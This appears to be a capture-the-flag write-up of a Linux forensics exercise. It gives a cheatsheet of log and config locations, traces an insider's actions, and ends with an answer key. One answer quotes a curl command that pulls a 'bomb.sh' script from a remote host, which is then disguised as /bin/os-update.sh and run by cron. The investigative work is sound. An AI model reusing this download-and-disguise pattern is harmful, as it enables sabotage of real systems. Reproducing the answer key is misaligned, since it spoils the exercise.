# Disgruntled - Easy

* Linux Forensics cheatsheet:

  * System and OS info:

    * OS release info - ```/etc/os-release```

    * User accounts info - ```/etc/passwd```

    * User group info - ```/etc/group```

    * Sudoers list - ```/etc/sudoers```

    * Login info - ```/var/log/wtmp```

    * Authentication logs - ```/var/log/auth.log*```

  * System config:

    * Hostname - ```/etc/hostname```

    * Timezone info - ```/etc/timezone```

    * Network interfaces - ```/etc/network/interfaces```, ```ip a s```

    * Open network connections - ```netstat -natp```

    * Running processes - ```ps aux```

    * DNS info - ```/etc/hosts```, ```/etc/resolv.conf```

  * Persistence mechanism:

    * Cron jobs - ```/etc/crontab```

    * Services - ```/etc/init.d```

    * Bash shell startup - ```/home/username/.bashrc``` (for user), ```/etc/bash.bashrc``` and ```/etc/profile``` (for system)

  * Evidence of execution:

    * Authentication logs - ```/var/log/auth.log*```

    * Bash history - ```/home/username/.bash_history```

    * Vim history - ```/home/username/.viminfo```

  * Log files:

    * Syslogs - ```/var/log/syslog```

    * Authentication logs - ```/var/log/auth.log*```

    * Third-party logs - ```/var/log```

* Now, ```ls -la /home``` shows us the user 'cybert' - this is the disgruntled IT user we have to check on.

* ```cat /home/cybert/.bash_history``` shows us the commands run by this user; this does not contain the complete list of commands though.

* As we want to check commands run using elevated privileges, we can check ```/var/log/auth.log```.

* The log file is huge, so we can filter out commands using ```cat /var/log/auth.log | grep "COMMAND="```.

* The logs also show that a user 'it-admin' was created after installing the package.

* The logs show that 'bomb.sh' file was edited - this is suspicious activity.

* Commands related to this script were run by 'it-admin', so we need to check that user's '.bash_history' file.

* Now, the script was edited using 'vi', so we can get more info using ```cat /home/it-admin/.viminfo```.

* We can view more info about the script found using ```ls -la /bin/os-update.sh``` and ```cat /bin/os-update.sh```.

* Now, this file is supposed to be executed later - we can check the cronjobs at ```/etc/crontab```.

* This contains a cronjob which can be decoded online to show when the script will be executed.

```markdown
1. The user installed a package on the machine using elevated privileges. According to the logs, what is the full command? - /usr/bin/apt install dokuwiki

2. What was the present working directory when the previous command was run? - /home/cybert

3. Which user was created after the package from the previous task was installed? - it-admin

4. A user was then later given sudo privileges. When was the sudoers file updated? - Dec 28 06:27:34

5. A script file was opened using the 'vi' text editor. What is the name of this file? - bomb.sh

6. What is the command used that created the file ```bomb.sh```? - curl 10.10.158.38:8080/bomb.sh --output bomb.sh

7. The file was renamed and moved to a different directory. What is the full path of this file now? - /bin/os-update.sh

8. When was the file from the previous question last modified? - Dec 28 06:29

9. What is the name of the file that will get created when the file mentioned executes? - goodbye.txt

10. At what time will the malicious file trigger? - 08:00 AM
```
